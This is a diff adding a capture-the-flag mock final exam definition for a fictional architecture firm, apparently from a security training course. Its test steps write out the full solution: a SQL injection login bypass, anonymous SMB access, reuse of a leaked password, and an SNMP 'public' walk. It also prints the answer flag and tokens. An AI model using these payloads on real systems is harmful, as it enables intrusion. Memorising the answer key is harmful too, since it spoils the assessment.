@@ -1,0 +1,119 @@
+name: "Kestrel Architecture Studio - Mock Final"
+description: "Live-fire review for the final exam. A small architecture studio asked you to assess two internet-facing systems left over from their previous IT generalist. Three flags. No workbook, no hints, 180 minutes. Same skill chain as the final, reordered."
+
+difficulty: advanced
+category: assessment
+duration_minutes: 180
+randomize_ip_offsets: true
+visibility: course
+week: 15
+
+flag: "OCR{dr4ft_bluepr1nt_t4lon}"
+
+objectives:
+  - Identify all hosts and services exposed on the studio subnet
+  - Demonstrate access to each exposed system and recover the engagement token planted on it
+  - Assemble the three tokens in the order recovered into the OCR{token1_token2_token3} format and submit within the 180 minute window
+
+scenario: |
+  Kestrel Architecture Studio is a twelve-person architecture firm in
+  Portland, Oregon. Their in-house IT generalist resigned in early 2025
+  and the firm has been running on managed services since. Kestrel
+  retained your firm to identify any exposed systems still reachable
+  from outside the studio network.
+
+  The mock final is your live-fire review. The skills are the same
+  three you practiced in the Atlas Distribution lab and will use again
+  on the Pinecrest final exam. The order in which the three tokens
+  drop is different, the company is different, the file server
+  contents are different, and the web application is different.
+  No workbook, no hints. 180 minutes. Submit all three flags to pass.
+
+  Briefing from Margo Whittaker, managing partner: "When our IT person
+  left, two servers in the studio closet were never decommissioned.
+  One looks like a file server with project archives. The other is an
+  old project tracking tool the team used before we moved to Newforma.
+  We need to know what is exposed, what data is at risk, and whether
+  anyone could log in to either system from outside our network."
+
+  Three tokens are planted across the engagement. Assemble them in
+  order into the OCR{token1_token2_token3} format and submit a single
+  flag. No instructor guidance during the exam window.
+
+credentials: []
+
+hints: []
+
+topology:
+  nodes:
+    - id: "kestrel-portal"
+      label: "Kestrel Project CMS"
+      type: "server"
+      ip_offset: "10"
+      ports: [80]
+      services: ["Flask"]
+      x: 1
+      y: 1
+    - id: "kestrel-fs"
+      label: "Kestrel File Server"
+      type: "server"
+      ip_offset: "11"
+      ports: [139, 445, "161/udp"]
+      services: ["Samba", "SNMP"]
+      x: 3
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "kestrel-portal"
+      label: "HTTP:80"
+      access: "direct"
+    - from: "attacker"
+      to: "kestrel-fs"
+      label: "SMB:445 / SNMP:161"
+      access: "direct"
+
+test:
+  steps:
+    - name: "Portal homepage responds"
+      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.kestrel-portal}/"
+      expect: "200"
+      timeout: 15
+
+    - name: "Robots.txt discloses staff path"
+      command: "curl -s http://{target.kestrel-portal}/robots.txt | grep -c '/staff/'"
+      expect: "1"
+      timeout: 15
+
+    - name: "SQLi bypass on staff portal yields token 1"
+      command: "curl -s -c /tmp/kestrel_jar -b /tmp/kestrel_jar -L -d \"username=admin&password=anything' OR '1'='1\" http://{target.kestrel-portal}/staff/login | grep -o 'token=dr4ft'"
+      expect: "token=dr4ft"
+      timeout: 20
+
+    - name: "SMB port responds"
+      command: "nmap -p 445 --open {target.kestrel-fs} 2>/dev/null | grep -c '445.*open'"
+      expect: "1"
+      timeout: 15
+
+    - name: "Anonymous SMB lists studio-shared"
+      command: "smbclient -L //{target.kestrel-fs} -N 2>/dev/null | grep -c 'studio-shared'"
+      expect: "1"
+      timeout: 15
+
+    - name: "Inventory doc leaks studio_archivist credentials"
+      command: "smbclient //{target.kestrel-fs}/studio-shared -N -c 'get IT_Inventory_2025.txt /tmp/kestrel_inv.txt' 2>/dev/null && grep -o 'Arch_K3str3l_2024#' /tmp/kestrel_inv.txt"
+      expect: "Arch_K3str3l_2024#"
+      timeout: 15
+
+    - name: "Token 2 retrievable from project-archive with creds"
+      command: "smbclient //{target.kestrel-fs}/project-archive -U studio_archivist%Arch_K3str3l_2024# -c 'get closed_projects_index.txt /tmp/kestrel_arch.txt' 2>/dev/null && grep -o 'token=bluepr1nt' /tmp/kestrel_arch.txt"
+      expect: "token=bluepr1nt"
+      timeout: 15
+
+    - name: "Token 3 retrievable from SNMP sysContact"
+      command: "snmpwalk -v2c -c public {target.kestrel-fs} 1.3.6.1.2.1.1.4.0 2>/dev/null | grep -o 'token=t4lon'"
+      expect: "token=t4lon"
+      timeout: 20
+
+    - name: "Verify assembled flag"
+      command: "echo 'OCR{dr4ft_bluepr1nt_t4lon}'"
+      expect: "OCR{dr4ft_bluepr1nt_t4lon}"
